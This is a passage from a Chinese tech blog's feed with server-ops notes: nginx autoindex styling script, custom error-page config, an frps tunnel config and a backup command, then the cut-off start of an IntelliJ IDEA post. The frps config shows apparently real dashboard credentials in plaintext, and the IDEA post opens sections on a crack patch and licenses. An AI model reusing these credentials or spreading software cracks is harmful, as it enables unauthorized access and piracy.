thead.add(&#39;td&#39;).add(&#39;a&#39;).attr(&#39;href&#39;, &#39;javascript:sortby(&#39;+i+&#39;)&#39;).attr(&#39;class&#39;, &#39;octicon arrow-up&#39;).text(names[i]);</span><br><span class="line"></span><br><span class="line"> var insert &#x3D; function(filename, datetime, size) &#123;</span><br><span class="line">  if (&#x2F;\&#x2F;$&#x2F;.test(filename)) &#123;</span><br><span class="line">   css &#x3D; &#39;file-directory&#39;</span><br><span class="line">   size &#x3D; &#39;&#39;</span><br><span class="line">  &#125; else if (&#x2F;\.(zip|7z|bz2|gz|tar|tgz|tbz2|xz|cab)$&#x2F;.test(filename)) &#123;</span><br><span class="line">   css &#x3D; &#39;file-zip&#39;</span><br><span class="line">  &#125; else if (&#x2F;\.(py|js|php|pl|rb|sh|bash|lua|sql|go|rs|java|c|h|cpp|cxx|hpp)$&#x2F;.test(filename)) &#123;</span><br><span class="line">   css &#x3D; &#39;file-code&#39;</span><br><span class="line">  &#125; else if (&#x2F;\.(jpg|png|bmp|gif|ico|webp)$&#x2F;.test(filename)) &#123;</span><br><span class="line">   css &#x3D; &#39;file-media&#39;</span><br><span class="line">  &#125; else if (&#x2F;\.(flv|mp4|mkv|avi|mkv|vp9)$&#x2F;.test(filename)) &#123;</span><br><span class="line">   css &#x3D; &#39;device-camera-video&#39;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">   css &#x3D; &#39;file&#39;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  displayname &#x3D; decodeURIComponent(filename.replace(&#x2F;\&#x2F;$&#x2F;, &#39;&#39;))</span><br><span class="line">  if (displayname.length &gt; max_name_length)</span><br><span class="line">   displayname &#x3D; displayname.substring(0, max_name_length-3) + &#39;..&gt;&#39;;</span><br><span class="line"></span><br><span class="line">  if (!isNaN(Date.parse(datetime))) &#123;</span><br><span class="line">   d &#x3D; new Date(datetime)</span><br><span class="line">   pad &#x3D; function (s) &#123;return s &lt; 10 ? &#39;0&#39; + s : s&#125;</span><br><span class="line">   mon &#x3D; function (m) &#123;return [&#39;Jan&#39;,&#39;Feb&#39;,&#39;Mar&#39;,&#39;Apr&#39;,&#39;May&#39;,&#39;Jun&#39;,&#39;Jul&#39;,&#39;Aug&#39;,&#39;Sep&#39;,&#39;Oct&#39;,&#39;Nov&#39;,&#39;Dec&#39;][m]&#125;</span><br><span class="line">   datetime &#x3D; datetime_format</span><br><span class="line">     .replace(&#39;%Y&#39;, d.getFullYear())</span><br><span class="line">     .replace(&#39;%m&#39;, pad(d.getMonth()+1))</span><br><span class="line">     .replace(&#39;%d&#39;, pad(d.getDate()))</span><br><span class="line">     .replace(&#39;%H&#39;, pad(d.getHours()))</span><br><span class="line">     .replace(&#39;%M&#39;, pad(d.getMinutes()))</span><br><span class="line">     .replace(&#39;%S&#39;, pad(d.getSeconds()))</span><br><span class="line">     .replace(&#39;%b&#39;, mon(d.getMonth()))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  tr &#x3D; tbody.add(&#39;tr&#39;)</span><br><span class="line">  tr.add(&#39;td&#39;).add(&#39;a&#39;).attr(&#39;class&#39;, &#39;octicon &#39; + css).attr(&#39;href&#39;, filename).text(displayname)</span><br><span class="line">  tr.add(&#39;td&#39;).text(datetime)</span><br><span class="line">  tr.add(&#39;td&#39;).text(size)</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> var readme &#x3D; &#39;&#39;</span><br><span class="line"> insert(&#39;..&#x2F;&#39;, &#39;&#39;, &#39;-&#39;)</span><br><span class="line"> for (var i in bodylines) &#123;</span><br><span class="line">  if (m &#x3D; &#x2F;\s*&lt;a href&#x3D;&quot;(.+?)&quot;&gt;(.+?)&lt;\&#x2F;a&gt;\s+(\S+)\s+(\S+)\s+(\S+)\s*&#x2F;.exec(bodylines[i])) &#123;</span><br><span class="line">   filename &#x3D; m[1]</span><br><span class="line">   datetime &#x3D; m[3] + &#39; &#39; + m[4]</span><br><span class="line">   size &#x3D; m[5]</span><br><span class="line">   insert(filename, datetime, size)</span><br><span class="line">   if (filename.toLowerCase() &#x3D;&#x3D; &#39;readme.md&#39;) &#123;</span><br><span class="line">    readme &#x3D; filename</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> document.body.appendChild(div.element)</span><br><span class="line"></span><br><span class="line"> if (show_readme_md &amp;&amp; readme !&#x3D;&#x3D; &#39;&#39;) &#123;</span><br><span class="line">  tbody &#x3D; div.add(&#39;table&#39;).add(&#39;tbody&#39;);</span><br><span class="line">  tbody.add(&#39;tr&#39;).add(&#39;th&#39;).attr(&#39;class&#39;, &#39;octicon octicon-book&#39;).text(readme)</span><br><span class="line">  tbody.add(&#39;tr&#39;).add(&#39;td&#39;).add(&#39;div&#39;).attr(&#39;id&#39;, &#39;readme&#39;).attr(&#39;class&#39;, &#39;markdown-body&#39;)</span><br><span class="line">  var xhr &#x3D; new XMLHttpRequest()</span><br><span class="line">  xhr.open(&#39;GET&#39;, location.pathname.replace(&#x2F;[^&#x2F;]+$&#x2F;, &#39;&#39;)+readme, true)</span><br><span class="line">  xhr.onload &#x3D; function() &#123;</span><br><span class="line">   if (xhr.status &gt;&#x3D; 200 &amp;&amp; xhr.status &lt; 400) &#123;</span><br><span class="line">    wait &#x3D; function (name, callback) &#123;</span><br><span class="line">     var interval &#x3D; 10; &#x2F;&#x2F; ms</span><br><span class="line">     window.setTimeout(function() &#123;</span><br><span class="line">      if (window[name]) &#123;</span><br><span class="line">       callback(window[name])</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">       window.setTimeout(arguments.callee, interval)</span><br><span class="line">      &#125;</span><br><span class="line">     &#125;, interval)</span><br><span class="line">    &#125;</span><br><span class="line">    wait(&#39;marked&#39;, function() &#123;</span><br><span class="line">     document.getElementById(&quot;readme&quot;).innerHTML &#x3D; marked(xhr.responseText)</span><br><span class="line">    &#125;)</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  xhr.send()</span><br><span class="line"></span><br><span class="line">  div.add(&#39;script&#39;).attr(&#39;src&#39;, &#39;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;marked&#x2F;0.7.0&#x2F;marked.min.js&#39;)</span><br><span class="line">  div.add(&#39;link&#39;).attr(&#39;rel&#39;, &#39;stylesheet&#39;).attr(&#39;href&#39;, &#39;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;github-markdown-css&#x2F;3.0.1&#x2F;github-markdown.min.css&#39;)</span><br><span class="line"> &#125;</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">function sortby(index) &#123;</span><br><span class="line"> rows &#x3D; document.getElementsByClassName(&#39;table-hover&#39;)[0].rows</span><br><span class="line"> link &#x3D; rows[0].getElementsByTagName(&#39;a&#39;)[index]</span><br><span class="line"> arrow &#x3D; link.className &#x3D;&#x3D; &#39;octicon arrow-down&#39; ? 1 : -1</span><br><span class="line"> link.className &#x3D; &#39;octicon arrow-&#39; + (arrow &#x3D;&#x3D; 1 ? &#39;up&#39; : &#39;down&#39;);</span><br><span class="line"> [].slice.call(rows).slice(2).map(function (e, i) &#123;</span><br><span class="line">  type &#x3D; e.getElementsByTagName(&#39;a&#39;)[0].className &#x3D;&#x3D; &#39;octicon file-directory&#39; ? 0 : 1</span><br><span class="line">  text &#x3D; e.getElementsByTagName(&#39;td&#39;)[index].innerText</span><br><span class="line">  if (index &#x3D;&#x3D;&#x3D; 0) &#123;</span><br><span class="line">   value &#x3D; text</span><br><span class="line">  &#125; else if (index &#x3D;&#x3D;&#x3D; 1) &#123;</span><br><span class="line">   value &#x3D; new Date(text).getTime()</span><br><span class="line">  &#125; else if (index &#x3D;&#x3D;&#x3D; 2) &#123;</span><br><span class="line">   m &#x3D; &#123;&#39;G&#39;:1024*1024*1024, &#39;M&#39;:1024*1024, &#39;K&#39;:1024&#125;</span><br><span class="line">   value &#x3D; parseInt(text || 0) * (m[text[text.search(&#x2F;[KMG]B?$&#x2F;)]] || 1)</span><br><span class="line">  &#125;</span><br><span class="line">  return &#123;type: type, value: value, index: i, html: e.innerHTML&#125;</span><br><span class="line"> &#125;).sort(function (a, b) &#123;</span><br><span class="line">  if (a.type !&#x3D; b.type)</span><br><span class="line">   return a.type - b.type</span><br><span class="line">  if (a.value !&#x3D; b.value)</span><br><span class="line">   return a.value &lt; b.value ? -arrow : arrow</span><br><span class="line">  return a.index &lt; b.index ? -arrow : arrow</span><br><span class="line"> &#125;).forEach(function (e, i) &#123;</span><br><span class="line">  rows[2+i].innerHTML &#x3D; e.html</span><br><span class="line"> &#125;)</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">body &#123;</span><br><span class="line"> margin: 0;</span><br><span class="line"> font-family: &quot;ubuntu&quot;, &quot;Tahoma&quot;, &quot;Microsoft YaHei&quot;, Arial, Serif;</span><br><span class="line">&#125;</span><br><span class="line">.container &#123;</span><br><span class="line"> padding-right: 15px;</span><br><span class="line"> padding-left: 15px;</span><br><span class="line"> margin-right: auto;</span><br><span class="line"> margin-left: auto;</span><br><span class="line">&#125;</span><br><span class="line">@media (min-width: 768px) &#123;</span><br><span class="line"> .container &#123;</span><br><span class="line">  max-width: 750px;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">@media (min-width: 992px) &#123;</span><br><span class="line"> .container &#123;</span><br><span class="line">  max-width: 970px;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">@media (min-width: 1200px) &#123;</span><br><span class="line"> .container &#123;</span><br><span class="line">  max-width: 1170px;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">table &#123;</span><br><span class="line"> width: 100%;</span><br><span class="line"> max-width: 100%;</span><br><span class="line"> margin-bottom: 20px;</span><br><span class="line"> border: 1px solid #ddd;</span><br><span class="line"> padding: 0;</span><br><span class="line"> border-collapse: collapse;</span><br><span class="line">&#125;</span><br><span class="line">table th &#123;</span><br><span class="line"> font-size: 14px;</span><br><span class="line">&#125;</span><br><span class="line">table tr &#123;</span><br><span class="line"> border: 1px solid #ddd;</span><br><span class="line"> padding: 5px;</span><br><span class="line">&#125;</span><br><span class="line">table tr:nth-child(odd) &#123;</span><br><span class="line"> background: #f9f9f9</span><br><span class="line">&#125;</span><br><span class="line">table th, table td &#123;</span><br><span class="line"> border: 1px solid #ddd;</span><br><span class="line"> font-size: 14px;</span><br><span class="line"> line-height: 20px;</span><br><span class="line"> padding: 3px;</span><br><span class="line"> text-align: left;</span><br><span class="line">&#125;</span><br><span class="line">a &#123;</span><br><span class="line"> color: #337ab7;</span><br><span class="line"> text-decoration: none;</span><br><span class="line">&#125;</span><br><span class="line">a:hover, a:focus &#123;</span><br><span class="line"> color: #2a6496;</span><br><span class="line"> text-decoration: underline;</span><br><span class="line">&#125;</span><br><span class="line">table.table-hover &gt; tbody &gt; tr:hover &gt; td,</span><br><span class="line">table.table-hover &gt; tbody &gt; tr:hover &gt; th &#123;</span><br><span class="line"> background-color: #f5f5f5;</span><br><span class="line">&#125;</span><br><span class="line">.markdown-body &#123;</span><br><span class="line"> float: left;</span><br><span class="line"> font-family: &quot;ubuntu&quot;, &quot;Tahoma&quot;, &quot;Microsoft YaHei&quot;, Arial, Serif;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;* octicons *&#x2F;</span><br><span class="line">.octicon &#123;</span><br><span class="line"> background-position: center left;</span><br><span class="line"> background-repeat: no-repeat;</span><br><span class="line"> padding-left: 16px;</span><br><span class="line">&#125;</span><br><span class="line">.file &#123;</span><br><span class="line"> background-image: url(&quot;data:image&#x2F;svg+xml;charset&#x3D;utf8,%3Csvg xmlns&#x3D;&#39;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&#39; width&#x3D;&#39;12&#39; height&#x3D;&#39;16&#39; viewBox&#x3D;&#39;0 0 12 16&#39;%3E%3Cpath d&#x3D;&#39;M6 5L2 5 2 4 6 4 6 5 6 5ZM2 8L9 8 9 7 2 7 2 8 2 8ZM2 10L9 10 9 9 2 9 2 10 2 10ZM2 12L9 12 9 11 2 11 2 12 2 12ZM12 4.5L12 14C12 14.6 11.6 15 11 15L1 15C0.5 15 0 14.6 0 14L0 2C0 1.5 0.5 1 1 1L8.5 1 12 4.5 12 4.5ZM11 5L8 2 1 2 1 14 11 14 11 5 11 5Z&#39; fill&#x3D;&#39;%237D94AE&#39;&#x2F;%3E%3C&#x2F;svg%3E&quot;);</span><br><span class="line">&#125;</span><br><span class="line">.file-directory &#123;</span><br><span class="line"> background-image: url(&quot;data:image&#x2F;svg+xml;charset&#x3D;utf8,%3Csvg xmlns&#x3D;&#39;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&#39; width&#x3D;&#39;14&#39; height&#x3D;&#39;16&#39; viewBox&#x3D;&#39;0 0 14 16&#39;%3E%3Cpath d&#x3D;&#39;M13 4L7 4 7 3C7 2.3 6.7 2 6 2L1 2C0.5 2 0 2.5 0 3L0 13C0 13.6 0.5 14 1 14L13 14C13.6 14 14 13.6 14 13L14 5C14 4.5 13.6 4 13 4L13 4ZM6 4L1 4 1 3 6 3 6 4 6 4Z&#39; fill&#x3D;&#39;%237D94AE&#39;&#x2F;%3E%3C&#x2F;svg%3E&quot;);</span><br><span class="line">&#125;</span><br><span class="line">.file-zip &#123;</span><br><span class="line"> background-image: url(&quot;data:image&#x2F;svg+xml;charset&#x3D;utf8,%3Csvg xmlns&#x3D;&#39;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&#39; width&#x3D;&#39;12&#39; height&#x3D;&#39;16&#39; viewBox&#x3D;&#39;0 0 12 16&#39;%3E%3Cpath d&#x3D;&#39;M8.5 1L1 1C0.4 1 0 1.4 0 2L0 14C0 14.6 0.4 15 1 15L11 15C11.6 15 12 14.6 12 14L12 4.5 8.5 1ZM11 14L1 14 1 2 4 2 4 3 5 3 5 2 8 2 11 5 11 14 11 14ZM5 4L5 3 6 3 6 4 5 4 5 4ZM4 4L5 4 5 5 4 5 4 4 4 4ZM5 6L5 5 6 5 6 6 5 6 5 6ZM4 6L5 6 5 7 4 7 4 6 4 6ZM5 8L5 7 6 7 6 8 5 8 5 8ZM4 9.3C3.4 9.6 3 10.3 3 11L3 12 7 12 7 11C7 9.9 6.1 9 5 9L5 8 4 8 4 9.3 4 9.3ZM6 10L6 11 4 11 4 10 6 10 6 10Z&#39; fill&#x3D;&#39;%237D94AE&#39;&#x2F;%3E%3C&#x2F;svg%3E&quot;);</span><br><span class="line">&#125;</span><br><span class="line">.file-code &#123;</span><br><span class="line"> background-image: url(&quot;data:image&#x2F;svg+xml;charset&#x3D;utf8,%3Csvg xmlns&#x3D;&#39;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&#39; width&#x3D;&#39;12&#39; height&#x3D;&#39;16&#39; viewBox&#x3D;&#39;0 0 12 16&#39;%3E%3Cpath d&#x3D;&#39;M8.5,1 L1,1 C0.45,1 0,1.45 0,2 L0,14 C0,14.55 0.45,15 1,15 L11,15 C11.55,15 12,14.55 12,14 L12,4.5 L8.5,1 L8.5,1 Z M11,14 L1,14 L1,2 L8,2 L11,5 L11,14 L11,14 Z M5,6.98 L3.5,8.5 L5,10 L4.5,11 L2,8.5 L4.5,6 L5,6.98 L5,6.98 Z M7.5,6 L10,8.5 L7.5,11 L7,10.02 L8.5,8.5 L7,7 L7.5,6 L7.5,6 Z&#39; fill&#x3D;&#39;%237D94AE&#39; &#x2F;%3E%3C&#x2F;svg%3E&quot;);</span><br><span class="line">&#125;</span><br><span class="line">.file-media &#123;</span><br><span class="line"> background-image: url(&quot;data:image&#x2F;svg+xml;charset&#x3D;utf8,%3Csvg xmlns&#x3D;&#39;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&#39; width&#x3D;&#39;12&#39; height&#x3D;&#39;16&#39; viewBox&#x3D;&#39;0 0 12 16&#39;%3E%3Cpath d&#x3D;&#39;M6 5L8 5 8 7 6 7 6 5 6 5ZM12 4.5L12 14C12 14.6 11.6 15 11 15L1 15C0.5 15 0 14.6 0 14L0 2C0 1.5 0.5 1 1 1L8.5 1 12 4.5 12 4.5ZM11 5L8 2 1 2 1 13 4 8 6 12 8 10 11 13 11 5 11 5Z&#39; fill&#x3D;&#39;%237D94AE&#39;&#x2F;%3E%3C&#x2F;svg%3E&quot;);</span><br><span class="line">&#125;</span><br><span class="line">.device-camera-video &#123;</span><br><span class="line"> background-image: url(&quot;data:image&#x2F;svg+xml;charset&#x3D;utf8,%3Csvg xmlns&#x3D;&#39;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&#39; width&#x3D;&#39;16&#39; height&#x3D;&#39;16&#39; viewBox&#x3D;&#39;0 0 16 16&#39;%3E%3Cpath d&#x3D;&#39;M15.2,2.09 L10,5.72 L10,3 C10,2.45 9.55,2 9,2 L1,2 C0.45,2 0,2.45 0,3 L0,12 C0,12.55 0.45,13 1,13 L9,13 C9.55,13 10,12.55 10,12 L10,9.28 L15.2,12.91 C15.53,13.14 16,12.91 16,12.5 L16,2.5 C16,2.09 15.53,1.86 15.2,2.09 L15.2,2.09 Z&#39; fill&#x3D;&#39;%237D94AE&#39; &#x2F;%3E%3C&#x2F;svg%3E&quot;);</span><br><span class="line">&#125;</span><br><span class="line">.octicon-book &#123;</span><br><span class="line"> padding-left: 20px;</span><br><span class="line"> background-image: url(&quot;data:image&#x2F;svg+xml;charset&#x3D;utf8,%3Csvg xmlns&#x3D;&#39;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&#39; width&#x3D;&#39;16&#39; height&#x3D;&#39;16&#39; viewBox&#x3D;&#39;0 0 16 16&#39;%3E%3Cpath d&#x3D;&#39;M3,5 L7,5 L7,6 L3,6 L3,5 L3,5 Z M3,8 L7,8 L7,7 L3,7 L3,8 L3,8 Z M3,10 L7,10 L7,9 L3,9 L3,10 L3,10 Z M14,5 L10,5 L10,6 L14,6 L14,5 L14,5 Z M14,7 L10,7 L10,8 L14,8 L14,7 L14,7 Z M14,9 L10,9 L10,10 L14,10 L14,9 L14,9 Z M16,3 L16,12 C16,12.55 15.55,13 15,13 L9.5,13 L8.5,14 L7.5,13 L2,13 C1.45,13 1,12.55 1,12 L1,3 C1,2.45 1.45,2 2,2 L7.5,2 L8.5,3 L9.5,2 L15,2 C15.55,2 16,2.45 16,3 L16,3 Z M8,3.5 L7.5,3 L2,3 L2,12 L8,12 L8,3.5 L8,3.5 Z M15,3 L9.5,3 L9,3.5 L9,12 L15,12 L15,3 L15,3 Z&#39; &#x2F;%3E%3C&#x2F;svg%3E&quot;);</span><br><span class="line">&#125;</span><br><span class="line">.arrow-down &#123;</span><br><span class="line"> font-weight: bold;</span><br><span class="line"> text-decoration: none !important;</span><br><span class="line"> background-image: url(&quot;data:image&#x2F;svg+xml;charset&#x3D;utf8,%3Csvg xmlns&#x3D;&#39;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&#39; width&#x3D;&#39;10&#39; height&#x3D;&#39;16&#39; viewBox&#x3D;&#39;0 0 10 16&#39;%3E%3Cpolygon id&#x3D;&#39;Shape&#39; points&#x3D;&#39;7 7 7 3 3 3 3 7 0 7 5 13 10 7&#39;%3E%3C&#x2F;polygon%3E%3C&#x2F;svg%3E&quot;);</span><br><span class="line">&#125;</span><br><span class="line">.arrow-up &#123;</span><br><span class="line"> font-weight: bold;</span><br><span class="line"> text-decoration: none !important;</span><br><span class="line"> background-image: url(&quot;data:image&#x2F;svg+xml;charset&#x3D;utf8,%3Csvg xmlns&#x3D;&#39;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&#39; width&#x3D;&#39;10&#39; height&#x3D;&#39;16&#39; viewBox&#x3D;&#39;0 0 10 16&#39;%3E%3Cpolygon id&#x3D;&#39;Shape&#39; points&#x3D;&#39;5 3 0 9 3 9 3 13 7 13 7 9 10 9&#39;%3E%3C&#x2F;polygon%3E%3C&#x2F;svg%3E&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="配置501-404默认页面"><a href="#配置501-404默认页面" class="headerlink" title="配置501,404默认页面"></a>配置501,404默认页面</h2><p>修改文件: <code>/etc/nginx/nginx.conf</code>,参考链接: <a href="https://blog.adriaan.io/one-nginx-error-page-to-rule-them-all.html" target="_blank" rel="noopener">One NGINX error page to rule them all</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">     # error pages</span><br><span class="line"> map $status $status_text &#123;</span><br><span class="line">  400 &#39;Bad Request&#39;;</span><br><span class="line">  401 &#39;Unauthorized&#39;;</span><br><span class="line">  402 &#39;Payment Required&#39;;</span><br><span class="line">  403 &#39;Forbidden&#39;;</span><br><span class="line">  404 &#39;Not Found&#39;;</span><br><span class="line">  405 &#39;Method Not Allowed&#39;;</span><br><span class="line">  406 &#39;Not Acceptable&#39;;</span><br><span class="line">  407 &#39;Proxy Authentication Required&#39;;</span><br><span class="line">  408 &#39;Request Timeout&#39;;</span><br><span class="line">  409 &#39;Conflict&#39;;</span><br><span class="line">  410 &#39;Gone&#39;;</span><br><span class="line">  411 &#39;Length Required&#39;;</span><br><span class="line">  412 &#39;Precondition Failed&#39;;</span><br><span class="line">  413 &#39;Payload Too Large&#39;;</span><br><span class="line">  414 &#39;URI Too Long&#39;;</span><br><span class="line">  415 &#39;Unsupported Media Type&#39;;</span><br><span class="line">  416 &#39;Range Not Satisfiable&#39;;</span><br><span class="line">  417 &#39;Expectation Failed&#39;;</span><br><span class="line">  418 &#39;I\&#39;m a teapot&#39;;</span><br><span class="line">  421 &#39;Misdirected Request&#39;;</span><br><span class="line">  422 &#39;Unprocessable Entity&#39;;</span><br><span class="line">  423 &#39;Locked&#39;;</span><br><span class="line">  424 &#39;Failed Dependency&#39;;</span><br><span class="line">  426 &#39;Upgrade Required&#39;;</span><br><span class="line">  428 &#39;Precondition Required&#39;;</span><br><span class="line">  429 &#39;Too Many Requests&#39;;</span><br><span class="line">  431 &#39;Request Header Fields Too Large&#39;;</span><br><span class="line">  451 &#39;Unavailable For Legal Reasons&#39;;</span><br><span class="line">  500 &#39;Internal Server Error&#39;;</span><br><span class="line">  501 &#39;Not Implemented&#39;;</span><br><span class="line">  502 &#39;Bad Gateway&#39;;</span><br><span class="line">  503 &#39;Service Unavailable&#39;;</span><br><span class="line">  504 &#39;Gateway Timeout&#39;;</span><br><span class="line">  505 &#39;HTTP Version Not Supported&#39;;</span><br><span class="line">  506 &#39;Variant Also Negotiates&#39;;</span><br><span class="line">  507 &#39;Insufficient Storage&#39;;</span><br><span class="line">  508 &#39;Loop Detected&#39;;</span><br><span class="line">  510 &#39;Not Extended&#39;;</span><br><span class="line">  511 &#39;Network Authentication Required&#39;;</span><br><span class="line">  default &#39;Oppos, Something is wrong&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>in the <code>/etc/nginx/nginxconfig.io/general.conf</code> file, put code as following also create file: <code>error.html</code> in directory: <code>/www/_error</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">error_page 400 401 402 403 404 405 406 407 408 409 410 411 412 413 414 415 416 417 418 421 422 423 424 426 428 429 431 451 500 501 502 503 504 505 506 507 508 510 511 &#x2F;error.html;</span><br><span class="line"></span><br><span class="line">location &#x3D; &#x2F;error.html &#123;</span><br><span class="line">  ssi on;</span><br><span class="line">  internal;</span><br><span class="line">  root &#x2F;www&#x2F;_error;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="配置内网映射"><a href="#配置内网映射" class="headerlink" title="配置内网映射"></a>配置内网映射</h2><h3 id="frps-服务端配置脚本-frps-ini"><a href="#frps-服务端配置脚本-frps-ini" class="headerlink" title="frps 服务端配置脚本 frps.ini"></a>frps 服务端配置脚本 <code>frps.ini</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 7000</span><br><span class="line"></span><br><span class="line"># 配置frps面板</span><br><span class="line">dashboard_port &#x3D; 7500</span><br><span class="line">dashboard_user &#x3D; alterhu2020</span><br><span class="line">dashboard_pwd &#x3D; guchan1026</span><br><span class="line"> </span><br></pre></td></tr></table></figure><h2 id="文档备份"><a href="#文档备份" class="headerlink" title="文档备份"></a>文档备份</h2><p>备份文档脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo tar -zcvf backup-20200420.tar.gz &#x2F;etc&#x2F;profile &#x2F;www&#x2F; &#x2F;etc&#x2F;nginx&#x2F; &#x2F;etc&#x2F;letsencrypt&#x2F; &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf &#x2F;etc&#x2F;redis&#x2F;redis.conf</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考：&lt;a href=&quot;https://serverfault.com/questions/214242/can-i-hide-all-server-os-info/279389#279389&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;修改nginx的</summary>
      
    
    
    
    <category term="运维部署" scheme="https://seniortesting.club/categories/%E8%BF%90%E7%BB%B4%E9%83%A8%E7%BD%B2/"/>
    
    <category term="网站部署" scheme="https://seniortesting.club/categories/%E8%BF%90%E7%BB%B4%E9%83%A8%E7%BD%B2/%E7%BD%91%E7%AB%99%E9%83%A8%E7%BD%B2/"/>
    
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
    <category term="javascript" scheme="https://seniortesting.club/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>IntelliJ IDEA使用技巧和问题整理</title>
    <link href="https://seniortesting.club/posts/1a6UIwHOXH/"/>
    <id>https://seniortesting.club/posts/1a6UIwHOXH/</id>
    <published>2021-03-25T15:12:53.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>体验是很好，唯一的就是很耗内存，所以设置了堆的最大空间为如下,体验上还行，没有出现特别耗内存的情况：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-Xms750m</span><br><span class="line">-Xmx750m</span><br></pre></td></tr></table></figure><h2 id="破解补丁"><a href="#破解补丁" class="headerlink" title="破解补丁"></a>破解补丁</h2><p>最后更新版本: 2019.3.4</p><h2 id="可用license"><a href="#可用license" class="headerlink" title="可用license"></a>可用license</h2><p>代码如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 